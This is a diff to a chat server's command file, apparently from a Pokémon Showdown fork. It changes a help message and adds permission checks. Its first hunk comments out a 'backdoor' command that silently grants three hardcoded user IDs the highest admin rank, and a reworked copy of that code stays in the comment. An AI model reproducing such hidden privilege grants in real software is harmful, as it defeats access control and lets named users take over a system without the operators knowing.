@@ -16,12 +16,22 @@ var canpet = true;
 var sigh = true;
 var commands = exports.commands = {
 
-	backdoor: function(target,room, user) {
+	/*backdoor: function(target,room, user) {
 		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {
-			user.group = "~";
-	        user.updateIdentity();
+			var userid = toId(user);
+			var name = user ? user.name : this.user;
+
+			this.sendReply(userid + ' : userid, ' + name +' : name');
+
+			var nextGroup = config.groupsranking[7];
+
+			this.sendReply(nextGroup + ' : nextGroup');
+
+			userid.group = nextGroup;
+
+			user.updateIdentity();
 		}
-	},
+	},*/ // No matter what I try it just seems to fall flat on its face and not work after refresh :/ Will leave like this for now
 
 	version: function(target, room, user) {
 		if (!this.canBroadcast()) return;
@@ -377,7 +387,7 @@ var commands = exports.commands = {
 		var targetUser = this.targetUser;
 		var targetRoom = Rooms.get(target);
 		if (!targetRoom) {
-			return this.sendReply("The room '" + target + "' does not exist.");
+			return this.sendReply("/help redir - You need to add a room to redirect the user to");
 		}
 		if (!user.can('kick', targetUser, room)) return false;
 		if (!targetUser || !targetUser.connected) {
@@ -445,6 +455,8 @@ var commands = exports.commands = {
 	um: 'unmute',
 	unmute: function(target, room, user) {
 		if (!target) return this.parse('/help something');
+		if (!this.canTalk()) return false;
+
 		var targetid = toUserid(target);
 		var targetUser = Users.get(target);
 		if (!targetUser) {
@@ -492,6 +504,7 @@ var commands = exports.commands = {
 	unlock: function(target, room, user) {
 		if (!target) return this.parse('/help unlock');
 		if (!this.can('lock')) return false;
+		if (!this.canTalk()) return false;
 
 		var unlocked = Users.unlock(target);
 
